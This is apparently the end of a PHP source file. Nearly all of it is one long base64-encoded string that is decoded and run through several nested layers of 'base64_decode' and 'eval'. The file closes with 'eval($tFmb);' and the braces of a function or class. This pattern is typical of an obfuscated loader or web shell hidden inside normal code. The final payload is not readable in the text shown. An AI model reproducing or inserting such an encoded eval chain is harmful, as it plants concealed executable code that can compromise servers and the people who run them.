kZSS1YxWnJPVmRWYlhST1RXMW9UbFp0ZEc5VU1WRjRVbGhzYVZKVmNHaFVWV1EwVWxaV1YxcEhkRlJpUlZZelZXMHdNVlpHV2xaT1ZVNVlZV3RLZWxWcldrZFhSbkJHWTBaS1RsSldjRFZXYWtaVFV6SkplVlJ1VGxSaVIzaHZWV3RXUzJGR1duVmpSbHByVFZkNFdGZFljRmRoTVZwVlVsUktWVlp0YUROWlZFWmFaREpPUlZkdFJsTldNbWhNVjFkd1EyUXhUa2hXYTJ4U1lraENUMWxyV25abFJtUlpZMFYwVjAxWVFqQlZiR2h6VmpKR2MxZHJOVlpoTVZZeldsVmFVMUpzVm5KWGJYQlRWa2QwTmxaR1ZsZE5Sa3BYVm14b1VGWjZWbFZXYkZVeFVURmtjVkZ1VGxOU2ExcFpWMnRXZDFWck1VWlhibFpXVFZaYVVGVlhlSFprTWtwR1ZXeEtWMDFzU25aV2JYQkhZekpTYzFSWVpGVmlSVFZ2VkZkMGMwNVdVbGRhUnpsb1VteHZNbFp0ZEZkWGJGcFlWV3RvWVZac1ZqUldiRlY0VWxkS1JtUkdUazVTUmxsNVZqRmFVMUV4VlhsVmJsSlVZa2RvVkZsdGRFdGpSbXhZWkVaa2FXSkZOVEJaYTFwM1dWVXhTVkZyYkZkV2VsWm9XVlphV21ReFpIVmFSbkJwVjBaS1VWZFhjRWRqTVdSWFZHeHNhVkpyV2xoVmExWkxaVlpaZUZWcmRHbE5helY2VlRKMGIxVkdaRWRUYlVaWFlXdHZNRlJXV2xOWFIwcEdVMjFzVjFkRlNqTldWbHByVFVac1YxTnFXbWxTUlVwWlZtMHhVMlZzY0VkWGExcHNWakJhU1ZsVlpIZGhSMFkyVVZSR1YxWldjRkJXVkVwSFpFWktjbUZIZEZOV2JIQjNWa1prZDFJeVNYaGlSbVJhWld0S2MxbFVTalJTVmxsNFdUTm9WR0pGVmpSVk1qVkhWMnhhV0ZWWVpGWmlWRVpZVlRGYVYyUkhWa2hpUjJ4cFVsaEJlbFl4WkhkVGF6RklWbXRrVW1KR1drOVZhazVUWVVaWmQxcEhOV3ROVjFKNlYxaHdSMkpIU2xaWGJHeFZUVmRvV0ZaWGMzaGtSMFpJVDFad1RtSnJTa2hXTW5CRFpESk9SMXBHYUdGU1dGSlVWRlZTVjAxc1pGZFZhMDVYVFVSV1NWWlhkRzlXTWtwelYyNUtWbUZyYnpCVVYzaHpaRWRPUm1OR1FsZGhNSEJXVm14amVFNUhTa2RVYTJSVVltczFZVmxzVWxkVlJtdDNXa1Z3YkZaVVZsZFdWekZ2VlRBeFIySjZSbGRTYlZKNlZWY3hTMVp0VGtsUmJFcFhUVEZLYUZaR1kzaGlNbFpYVm01T2FGSjZiRTlWYlRWRFYxWlNjMVZyVG1oU2JHOHlXV3RTUjFaV1pFaFBWRTVWVFZaYU0xVXdXbUZqVmxaMFpFWk9UbFp0T1RSV01XaDNVekpOZVZWdVVsUmlhM0JXV1d4U2MxbFdXWGRXYms1UFlrVXhORlpXYUd0VlJscDFVV3BDVm1KVVZsQlpWM040WXpGYWRWcEdVbGRXTW1jeVZqSndRMk14U2tkU2JHaGhVbGhDVTFSVlZtRmtWbFY0Vm1zNVVtSkhPVE5aYTFaVFZXeFplVlZyZEZaV1JVcElXVzE0VDFac1VuSlRiVVpPVWpOb1JsWldXbFpOVmtwSVVteGFVMkpVVmxWV2JGVXhVVEZrY1ZGdVRsTlNhMXBaVjJ0V2QxVnJNVVpYYmxaV1RWWmFVRlZYZUhaa01rcEdWV3hLVjAxc1NreFdWbEpEVWpKS2MxUnVTbWhTYXpWd1ZGZDBZVmRzV2tkaFJrNVdWakJ3UmxsclVsZFhSMHBJWVVaQ1lWSjZSbFJXTVZwUFpFZE9TRkpzWkZkV1JsWTFWakZqZDJWR2JGaFVhMlJxVWtaYVQxVlVUbE5qVmxKWVpFWndiRlp0VW5wV1J6QXhWbGRGZDA1WVpGWldiVkp5VlRKNFJtUXhTblJPVmxKWFZsUldSRll5Y0VOak1VcEhVbXhvWVZKWVFsTlVWVlpoWkZaVmVGWnJPVkppUnpreldXdFdVMVZzV1hsVmEzUldWa1ZLU0ZsdGVFOVdiRkp5WkVVNVRsTkZTa3BYYkZadlVURmtjazFZVGxoaGExcGhXbGQwZDFkR1pIUmxTRTVZVWpGYVNsVlhlSGRYUmtwVlZWUkdWMUpXU2t4VWEyUlBVakpGZW1KR1pHbGlSbkJvVmtaa05GWXdNWE5pU0VwaFUwVTFiMWxyYUVOWFZsSnpXa2hrV2xac1ZqTlphMmgzVlRGS2NsZHFTbGhoYTBwNlZXdGFSMWRHY0VaalJrcE9VbFp3TVZaVVJsZFVNVVp6WWpOa2FWSldTbE5XYWtwVFV6RldWVkZyWkdsaVJUVlhWa2QwUzFsVk1VaGxSVlpXVm0xU2NsVXllRVprTVVwMVVXeFNWMDF1YURWV1IzQkRWVEZXZEZOWWJHRlNXRUpUVkZWV1lXUldWWGhXYXpsU1lrYzVNMWxyVmxOVmJGbDVWV3QwVmxaRlNraFpiWGhQVm14U2NsTnRSazVUUlVwTFZteGpkMDVYUmtkYVJWcE9Wa1ZLVjFWdWNFTk9SbXh5V2tVMWJHSkdTakJaVldSSFZHMUtSMk5HUWxkTlZuQnhWRlprUjFJeVNYcGlSbVJwWWxob1QxWnRkRk5XTWtsNFdraEtZVkpyTlZSWmJGVXhUVlpWZVU1WFJtaGlWVnBaV1ZWamVGZEdUa2hsU0ZaYVZteHdWRlV3WkV0VFIwNUlVbXhrYkdKR2NEUldha28wVkRGRmVWUnVUbXBTYlhodlZGY3hVMkl4V1hkV1dHaHBZa2Q0V0ZkWWNFZFViVXBJWlVac1lWWlhhRVJYVmxwR1pERk9kVlZzY0doaGVsWk1Wakp3UzFVeFRraFNhMnhTWWxoQ2MxWnNWbmRsVm1SWVkwVndiRkl3V2tsVmJYaHZWREZKZVZWdVJsWmhhelYyV1hwR2ExWXlSa1pQVjJ4VFZqTm9TbFpyWXpGWlYwWllVMjVPVkdKVWJGbFdhMVV4VlRGa2NWTnNUbGhXYkVwYVZtMTBkMkZHV1hwVmFrNVhVa1UxY1ZwRVJrNWtNa3BHVld4S1YwMXNTa3hXVmxKRFVqSktjMVJzV2xWaE1IQm9WRlZrTkZKV1ZsZGFSM1JVWWtWV00xVnRNREZXUmxwV1RsWlNWVlpYVWtoVk1HUkxVMWRPUmsxV1pGTlNiSEF3VmpGU1NtVkdXWGxXYmxKVllUSm9VVll3V21GalZsSllaVWRHVkZKdFVsaFhhMVUxVkd4SmQySkVXbFpOYmtKWVZrWmFZVkpXV25WU2JIQk9ZV3RhV1ZkV1ZtdFZNVTVIVjJ4b1VGWllhRmRhVjNSSFpWWmtXV05GZEZkTlJFWklWbTAxVTFZeVNsbFZiVGxYVFVaYU0xbDZSbXRXVmxKelUyMXNUbE5GU2twV2JHTjRZakpHY2sxWVVtaFRSVXBoV1ZkMGQxTkdjRmRYYm1SVFRWWndNVmxyWkhOVmF6RjFWVmhrVjFaWFRYaFdSRXBMVTBaT2RWVnNXbWxTVkZadlZtcENWazFWTUhoaVNFWlVWa1ZhYzFscmFFTldWbVJ4Vkd0T1ZsSXhTVEpWVjNRMFZrWmFWazVWVGxoaGEwcDZWV3RhUjFkR2NFWmpSa3BPVWxad01WWlVSbGRVTVVaellqTmthVkpXU2xOV2FrcFRVekZXY1ZKcmRHdE5WMUo2Vmtjd01XRnNTbFZoTTNCVlZsWlpkMVV5ZUVaa01VcDBUbFpTVjFaVVZrUldNbkJEWXpGS1IxSnNhR0ZTV0VKVFZGVldZV1JXVlhoV2F6bFNZa2M1TTFsclZuTlViRXBWVm10V1dsWnNXa2haYlhoUFZteFNjbE50Ums1U00yaEdWbFphYTJFeFRuTlNXR1JUWWxSV1ZWWnNaR3ROTVZwSVpFVTVhbEpyV2xsWGExWjNWV3N4UmxkdVZsWk5WbHBRVlZkNGRtUXlTa1pWYkVwWFRXeEtURlpYY0VkWlYxWnpZa1JhVkdKR2NGWlpWRUV4WkRGV1YxcEhkRlJpUlZZelZXMHdNVlpHV2xaT1ZVNVlZV3RLZWxWcldrZFhSbkJHWTBaU1ZGSlVWbEZXVmxKTFl6RkdjMkl6WkdsU1ZrcFRWbXBLVTFNeFZsVlJhMlJwWWtVMVYxWkhkRXRaVlRGSVpVVldWbFp0VW5KVk1uaEdaREZLZFZOdFJsTldNVW95VjFSQ2ExUXdOVlpOVlZKclVtMTRUMVJWYUVObGJHUlpZMFZ3VDFaVVJsbFdSelZUVmxkS1dXRkdUbFZXTTBKNlZGWmFhMlJGTVZsVWJXeG9UVEpvVjFaSGVHOWtNV1J6V2tWa2FsTkZOVlZVVlZaWFRURldObEZ1VGxOU2ExcFpWMnRXZDFWck1VWlhibFpXVFZaYVVGVlhlSFprTWtwR1ZXeEtWMDFzU2t4V1ZsSkRVakpLYzFSc1dsVmhNSEJvVkZWa05GSldWbGRhUjNSVVlrVldNMVZ0TURGV1JsbzJWbXBhV2xaRmNFeFZNR1JMVTBkT1NGSnNaR3hpUm10NVZtcEtORmRyTlZoU2EyaFVZVEpvY0ZWcVNtOWpWbEpaWTBWT1RtSkhlSGxYYTJoUFlVZEtTVkZzYkZWaVIxSXpWMVphVjA1dFNrbGpSbkJYWWxaS1VWZFhkR3RUTWxKSFZXNVNiRkpZUW05V01HUlRWVVpXVlZOdVRsSmlSemt6V1d0V1UxVnNXWGxWYTNSV1ZrVktTRmx0ZUU5V2JGSnlVMjFHVGxJemFFWldWbHByWVRGT2MxSllaRk5pVkZaVlZteFZNVkV4WkhGUmJrNVRVbXRhV1ZkclZuZFZhekZJWlVoa1ZtVnJXbFJhVjNoVFkyeFNkVkZzU2xkTmJFcE1WbFpTUTFJeVNuTlViRnBWWVRCd2FGUlZaRFJTVmxaWFdrZDBWR0pGVmpOVmJUQXhWa1phVms1VlRscFdSWEJVVlRCa1IxTldSblJqUjNoWFVsVmFOVll4WkRSaE1WbDVWbTVTVlZkSGVGUlpiRkpYWVVaYWMxVnJaR2xOVjNnd1ZGWldhMkZYU2tsUmJIQldUVmRvVkZaV1pFdFdiR1IxVTJ4b2FFMVdjRmxYYkZwclZESlNSazlXYkdsU1dHaFVXVmN4TkdSR1ZqWlJhemxVVFZaS1dWVnRlRzlXVjBwWllVaENXbUpHVlhoWmVrWlBWbXh3UlZGdGJGTk5WbkJXVmxaak1WRXlSblJXYkZwVVltMVNZVmxzVWxkaFJteFdXa1YwVkZJd2NFbGFSVlozVlRBeFdWRlliRmhXUlhCNlZWUkJlRk5HU25KaFIyeFVVMFZLVEZaWGNFZFRNREZ6WWtoT1lWSlhVbkZWYWtKM1pERldXRTVYZEdoV2EydzBWakl3TlZkdFZuSmpSbVJZWVd0YWVWcFdWVFZYVmxwMFpFWk9UbEp1UWpSV01uUlhWREZGZDAxV2FGVmhiRnBRVldwS05GUldXbFZUYm5CT1RWVndTRlZ0TldGWlZURklaVVZXVmxadFVuSlZNbmhHWkRGS2RFNVdVbGRXVkZaRVZqSndRMk14U2tkU2JHaGhVbGhDVTFSVlZtRmtWbFY1WkVjNVZrMXJiRFZWYlhoelZsWmtSMU5zU2xwaE1VcDZWR3hhYTJNeVJrWlBWM1JPWVRKM01WWkhlRzlrTVd4WFYyeGthbEo2YkZsV2ExVXhWa1p3U0UxVk9XdFdNRlkyVmxkNFIyRldXbFZXVkVaWFRXNW9jbFZxUVhoU01rNUhWVzFHVGsxRmNFOVdiWFJUVmpBMWMxcElUbWhTYXpWWFZGWm9RMWRXV2xoT1ZVNW9ZbFZ3V0ZZeU5VZFpWa3BXVGxoV1dsWkZXak5WTUZwTFpGZE9TR0ZHVGs1VFJVWTFWbXBHWVdJeFRYbFNXR2hZWWtkNFZWbHRjekZVVmxwWlkwVkthbUpIZHpKVk1uaHJZVEZhZFZGcmFGWk5ha1V3V1ZkemQyUXhUbkZUYkhCcFZrWmFVVmRYZEZkTlJrcElVbXBhWVZKWVFsTlVWVlpoWkZaVmVGWnJPVkppUnpreldXdFdVMVZzV1hsVmEzUldWa1ZLU0ZsdGVFOVdiRkp5VTJ4V2FFMUVWak5XVmxwcllURk9jMUpZWkZOaVZGWlZWbXhWTVZFeFpIRlJiazVUVW10YVdWZHJWbmRWYXpGR1YyNVdWazFXV2xCVlZFcEdaVlpLYzJGR1pGZGxiWGhPVm0xMGIxUXhVWGhTV0d4cFVsVndhRlJWWkRSU1ZsWlhXa2QwVkdKRlZqTlZiVEF4VmtaYVZrNVZUbGhoYTBwNlZURlZlRkpyTlZaVmJXaFhWbFp3TVZaVVJsZFVNVVp6WWpOa2FWSldTbE5XYWtwVFpFWmFWMVZZWkZCV1dFRXlXWHBLTUZkSFNuSlhiR3hZVm1zMVExUXhWbk5TUm10NVpFZG9VMkpYYUZkWFZFWlBVV3M1Vm1KRmFGUmlWMmh4VkZkNFZtVldVbkpYVkZab1RWaENXVlpITldGWlZrbDRWbTVhVkdFeVVuSlZiVEZYWXpGdmVsRnNRbXhXVlhCNlYydGplRkl5VFhka1JWSldZbFJzV1ZWdGVFdE9SazE0Vlc1d2FXRjZhRFZXYlhCTFYyeFplbHBJV2xSaE1YQXpXbFZhV21WV1NsbFJiRUpyWldwQk5WTnVjSHBoTVZaSFdraG9XR0ZWUlRWVFZVNXFZVEpTYzFKdFJtcGhWVVUxVTFWa1MyRkhUWGxXVkVwUFVtcHNjbGRzWkU5a2JIQklWbGM1UzFOSVFsbGFSVnBHWTBVNU5WRnRlR3RpVlZwNlV6Qk9VMDFzVmxkalNHeE1Wa2hPZFZSNlNsZE5iR3hZWkRJNVMxSnJTbGxaTVZwMlkwVTVNMUJVTUc1UGVWSlFaVWhPVWtsRU1HZEtlVkpLVlc1T1dVbEVNR2RaYlVaNldsUlpNRmd5VW14Wk1qbHJXbE5uYTFvd2NHRmxRMnMzU1VkV01sbFhkMjlLUld4VFl6Rm5jRTk1WXpkYVdGcG9Za05uYTFRemFIcFZVMnMzSnpza1VYaEVjaUE5SUNja1RYaDZWeUE5SUdKaGMyVTJORjlrWldOdlpHVW9KRWh6V2xRcE95QmxkbUZzS0NSTmVIcFhLVHNuTzJWMllXd29KRkY0UkhJcE93PT0nOyRRZVhhID0gJyRzUXpXID0gYmFzZTY0X2RlY29kZSgkb0lYUSk7IGV2YWwoJHNRelcpOyc7ZXZhbCgkUWVYYSk7');eval($tFmb);
    }
}
